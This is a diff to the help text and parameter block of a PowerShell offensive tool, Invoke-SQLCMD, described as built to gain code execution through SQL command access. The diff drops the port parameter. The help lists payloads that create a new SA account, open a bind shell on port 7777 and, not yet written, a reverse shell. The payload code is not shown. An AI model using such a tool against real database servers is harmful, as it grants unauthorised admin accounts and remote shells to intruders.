@@ -5,7 +5,6 @@
   Simply built to pop code execution with basic SQL cmd access
 .PARAMETER 
   $RHost            = sets the target address (this can be localhost or the remote IP depending ont he situation)
-  $RPort            = sets the target port. often will be 1433
   $CreateNewSA      = payload after connecting will be: a new SA account
   $PopBindShell     = payload after connecting will be: A Binded Shell located $RHOST:7777
   $PopReverseShell  = payload after connecting will be: A Bind Shell calling back to $LPORT:7777 (tba)
@@ -21,7 +20,7 @@
   
 .EXAMPLE
   PS:/> Import-Module Invoke-SQLCMD.psm1
-  PS:/> Invoke-SQLCMD -RHost 10.1.1.1 -Rport 1433 -CreateNewSA
+  PS:/> Invoke-SQLCMD -RHost 10.1.1.1 -CreateNewSA
 #>
 
 
@@ -31,9 +30,6 @@ Function Global:InvokeWPS-SQLCMD(){
     (
         [Parameter(Mandatory)]
         [String] $RHost,
-
-        [Parameter(Mandatory)]
-        [Int]    $RPort = 1433,
 
         [Switch] $CreateNewSA,
         [Switch] $PopBindShell,
